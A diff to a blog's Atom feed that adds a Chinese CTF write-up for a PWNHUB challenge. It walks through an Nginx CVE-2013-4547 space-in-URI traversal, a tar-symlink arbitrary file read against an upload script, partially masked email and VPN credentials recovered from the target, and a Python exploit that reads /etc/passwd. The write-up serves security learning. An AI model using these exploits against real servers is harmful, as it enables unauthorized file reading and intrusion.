@@ -5,7 +5,7 @@
   <link href="/feed.xml" rel="self"/>
   
   <link href="https://www.virzz.com/"/>
-  <updated>2017-09-22T13:47:56.000Z</updated>
+  <updated>2017-10-05T11:13:36.000Z</updated>
   <id>https://www.virzz.com/</id>
   
   <author>
@@ -14,6 +14,169 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PWNHUB / 2013 那年 Writeup</title>
+    <link href="https://www.virzz.com/2017/10/05/pwnhub_2013_years.html"/>
+    <id>https://www.virzz.com/2017/10/05/pwnhub_2013_years.html</id>
+    <published>2017-10-05T11:11:15.000Z</published>
+    <updated>2017-10-05T11:13:36.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2>0x00 题目介绍</h2>
+<h3>详情</h3>
+<p>题目地址：54.223.177.152:80</p>
+<h3>更新</h3>
+<ul>
+<li>2017.10.03 17:50:16搞 Discuz 不是目的，谁说鸡肋就没用，看 Discuz 送助攻</li>
+<li>2017.10.03 11:24:40想办法把它变成任意文件读取，但 Flag 不在这儿 ，当作一次真实渗透玩吧！</li>
+<li>2017.10.02 15:45:49Nginx 虽然有过很多问题，但是它是个好 server</li>
+</ul>
+<h2>0x01 Nginx</h2>
+<p>各种坑，最好</p>
+<p>扫目录发现<code>http://54.223.177.152/.DS_Store</code></p>
+<ul>
+<li>index.html</li>
+<li>upload[0x20]</li>
+<li>index.php</li>
+<li>admin</li>
+<li>includes</li>
+<li>config</li>
+<li>pwnhub</li>
+</ul>
+<h3>CVE-2013-4547</h3>
+<pre><code>GET /upload /../pwnhub/index.html
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;a href=&quot;../6c58c8751bca32b9943b34d0ff29bc16/index.php&quot;&gt;get&lt;/a&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h2>0x02 Upload</h2>
+<p>再来一波<code>http://54.223.177.152/6c58c8751bca32b9943b34d0ff29bc16/.DS_Store</code></p>
+<p>发现<code>untar.py</code></p>
+<pre><code>import tarfile
+import sys
+import uuid
+import os
+
+
+def untar(filename):
+    os.chdir('/tmp/pwnhub/')
+    t = tarfile.open(filename, 'r')
+    for i in t.getnames():
+        if '..' in i or '.cfg' != os.path.splitext(i)[1]:
+            return 'error'
+        else:
+            try:
+                t.extract(i, '/tmp/pwnhub/')
+            except Exception, e:
+                return e
+            else:
+                cfgName = str(uuid.uuid1()) + '.cfg'
+                os.rename(i, cfgName)
+                return cfgName
+
+if __name__ == '__main__':
+    filename = sys.argv[1]
+    if not tarfile.is_tarfile(filename):
+        exit('error')
+    else:
+        print untar(filename)
+</code></pre>
+<p>构造存在软连接文件的tar就可以任意读文件了</p>
+<p>&lt;script src=&quot;<a href="https://gist.github.com/virink/8dcce55f93e2fb15c76b6198aba8d573.js" target="_blank" rel="external">https://gist.github.com/virink/8dcce55f93e2fb15c76b6198aba8d573.js</a>&quot;&gt;&lt;/script&gt;</p>
+<h2>0x03 VPN</h2>
+<pre><code>/proc/mounts
+/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh
+/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/run
+/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/mail_send.py
+</code></pre>
+<p>Email infomation:</p>
+<pre><code>mail_user = 'ctf_dicha@21cn.com'
+mail_pass = '634DRaC62______'
+</code></pre>
+<p>VPN infomation:</p>
+<pre><code>Server IP: 54.223.177.152
+IPsec PSK: dkQ97gGQPuVm83______
+Username: pwnhub
+Password: LE3U2aTgc4DGZd______
+</code></pre>
+<p>学校的网有毒。。。</p>
+<h2>0x04 End</h2>
+<p>最后反正是没做出来，</p>
+<p>内网渗透什么的、经验不够啊</p>
+<p>看了大佬们的WP才知道、要去扫docker默认网段</p>
+<blockquote>
+<p><a href="https://pwnhub.cn/media/writeup/158/208ea0fa-a31d-4cac-952d-687ebab837fc_a53727dd.pdf" target="_blank" rel="external">C014 Pwnhub_2013那年.pdf</a></p>
+</blockquote>
+<p><strong>MARK</strong><br>
+<em>docker启动时默认使用172.17.x.x作为容器的ip地址</em></p>
+<h2>0x05 Exp Script</h2>
+<pre><code>#!/usr/bin/env python2
+# coding=utf-8
+
+import os
+import sys
+import re
+import requests as req
+import urllib2
+from tar_archive_with_symboliclink import _tarfile
+
+
+URL = 'http://54.223.177.152/6c58c8751bca32b9943b34d0ff29bc16/index.php'
+
+HEADERS = {
+    'Origin': 'http://54.223.177.152',
+    'User-Agent': 'Mozilla/5.0 AppleWebKit/537.75.14 (KHTML, like Gecko) Safari'
+}
+
+def exp_1():
+    _req = urllib2.Request(
+        'http://54.223.177.152/upload\x20/../pwnhub/index.html')
+    res = urllib2.urlopen(_req)
+    print res.read()
+    res.close()
+
+def exp_2(fn=b'v.cfg', ln=b'/etc/passwd'):
+    fd = _tarfile(fn, b'', ln)
+    res = upload_file('v.tar', fd)
+    if res:
+        m = re.findall(
+            r'&lt;textarea cols=&quot;30&quot; rows=&quot;15&quot;&gt;(.*)&lt;/textarea&gt;', res, re.M | re.S)
+        if m:
+            return m[0]
+        else:
+            return res
+    else:
+        return False
+</code></pre>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2&gt;0x00 题目介绍&lt;/h2&gt;
+&lt;h3&gt;详情&lt;/h3&gt;
+&lt;p&gt;题目地址：54.223.177.152:80&lt;/p&gt;
+&lt;h3&gt;更新&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;2017.10.03 17:50:16搞 Discuz 不是目的，谁说鸡肋就没用，看 Discuz 送助攻&lt;/li&gt;
+    
+    </summary>
+    
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="pwnhub" scheme="https://www.virzz.com/tags/pwnhub/"/>
+    
+  </entry>
   
   <entry>
     <title>PWNHUB 公开赛 / 傻 fufu 的工作日 Writeup</title>
